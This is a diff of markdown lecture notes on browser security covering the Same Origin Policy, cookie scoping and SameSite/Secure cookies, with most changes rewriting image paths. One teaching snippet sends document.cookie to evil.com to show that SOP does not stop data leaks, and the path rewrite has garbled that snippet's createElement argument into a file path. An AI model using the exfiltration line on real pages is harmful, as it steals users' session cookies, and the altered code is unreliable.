@@ -5,7 +5,7 @@
     - Browsers are like operating systems
     - Need to isolate different activities
 
-![Alt text](image.png)
+![Alt text](./WebSecurity/image.png)
 
 ## Same Origin Policy (SOP)
 - Origin: isolation unit/trust boundary on the web
@@ -15,9 +15,9 @@
     - <ins>Confidentiality</ins>: Script contained in evil.com should not be able to read data in bank.ch page
     - Integrity: script from evil.com should not be able to modify the content of bank.ch page
 
-![Alt text](image-1.png)
-![Alt text](image-2.png)
-![Alt text](image-3.png)
+![Alt text](./WebSecurity/image-1.png)
+![Alt text](./WebSecurity/image-2.png)
+![Alt text](./WebSecurity/image-3.png)
 
 ## Scripts
 - __CAN__ load scripts from across origins
@@ -25,13 +25,13 @@
 - Scripts execute with privileges of the page
 - Page can see source via func.toString()
 
-![Alt text](image-4.png)
+![Alt text](./WebSecurity/image-4.png)
 
 ## Images
 - Browser renders cross-origin images, but SOP prevent page from inspecting individual pixels
 - But page can see other properties, like img.width
 
-![Alt text](image-5.png)
+![Alt text](./WebSecurity/image-5.png)
 
 # SOP for Cookies
 - DOM SOP: origin is a (scheme, domain, port)
@@ -42,14 +42,14 @@
     - Set-cookie: ```
     <cookie-name>=<cookie-value>; Domain=<domain-value>```
 
-![Alt text](image-6.png)
-![Alt text](image-7.png)
+![Alt text](./WebSecurity/image-6.png)
+![Alt text](./WebSecurity/image-7.png)
 
 - Can't set cookies for these public suffixes(?)
 
 ## How do we dicide to send coookies?
-![Alt text](image-8.png)
-![Alt text](image-9.png)
+![Alt text](./WebSecurity/image-8.png)
+![Alt text](./WebSecurity/image-9.png)
 
 ### Another Example
 - What happens when your bank includes Google Analytics Javascript (a tracker) in their web page? Can that code access your Bank's authentication cookie?
@@ -57,12 +57,12 @@
 
 - Also, SOP doesn't prevent leaking data:
 ```js
-const img = document.createElement("image");
+const img = document.createElement("./WebSecurity/image");
 img.src = "https://evil.com/?cookies=" + document.cookie;
 document.body.appendChild(img);
 ```
 
-![Alt text](image-10.png)
+![Alt text](./WebSecurity/image-10.png)
 
 ## Partial Solutions: SameSite Cookies
 ```js
@@ -73,9 +73,9 @@ SameSite=Strict;
 - Lax: Send cookie on top-level "safe" navigations (even if navigating cross-site)
 - None: send cookie without taking context into account
 
-![Alt text](image-11.png)
+![Alt text](./WebSecurity/image-11.png)
 
 ## Partial Solutions: Secure Cookies
 - A secure cookie is only sent to the server with an encrypted request over the HTTPS protocol
 
-![Alt text](image-12.png)
+![Alt text](./WebSecurity/image-12.png)
